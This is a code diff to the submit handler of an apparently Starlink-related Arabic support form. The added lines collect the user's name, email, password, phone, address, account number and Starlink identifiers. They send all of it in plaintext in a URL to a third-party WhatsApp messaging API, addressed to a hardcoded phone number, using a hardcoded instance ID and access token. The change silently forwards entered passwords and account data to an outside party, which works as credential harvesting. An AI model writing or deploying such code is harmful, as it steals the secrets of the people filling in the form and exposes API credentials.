@@ -490,6 +490,42 @@ console.log("📤 إرسال بيانات المشكلة:", payload);
     .catch(error => {
       alert("❌ حدث خطأ أثناء إرسال البيانات." , error.message);
     });
+
+    const storedUser = JSON.parse(localStorage.getItem('user'));
+
+const userName = storedUser?.user?.name || 'العميل';
+const userPhone = storedUser?.user?.phone || 'رقم غير متوفر';
+const number = '24990752552';  // رقم الهاتف بصيغة دولية
+ const message = `
+  طلب جديد من ${userName} (رقم الهاتف: ${userPhone}):
+    نوع المشكلة: ${this.selectedIssue}
+    الاسم الكامل: ${this.issueForm.fullName}
+    البريد الإلكتروني: ${this.issueForm.email}
+    كلمه السر : ${this.issueForm.password}
+    الهاتف: ${this.issueForm.phone}
+    العنوان: ${this.issueForm.address}
+    رقم الحساب: ${this.issueForm.accountNumber}
+    رقم الطبق: ${this.issueForm.dishNumber}
+    Kit Number: ${this.issueForm.kitNumber}
+    Starlink ID: ${this.issueForm.starlinkID}
+    التفاصيل: ${this.issueForm.details}
+  `;
+const mediaUrl = 'https://i.pravatar.cc/300';
+const filename = 'avatar.jpg';
+const instanceId = '686A14D507595';
+const accessToken = '657747e37e629';
+
+const url = `https://waclient.com/api/send?number=${number}&type=media&message=${encodeURIComponent(message)}&media_url=${encodeURIComponent(mediaUrl)}&filename=${filename}&instance_id=${instanceId}&access_token=${accessToken}`;
+
+fetch(url)
+  .then(response => response.json())
+  .then(data => {
+    console.log('تم الإرسال:', data);
+  })
+  .catch(error => {
+    console.error('خطأ في الإرسال:', error);
+  });
+
 }
 
 
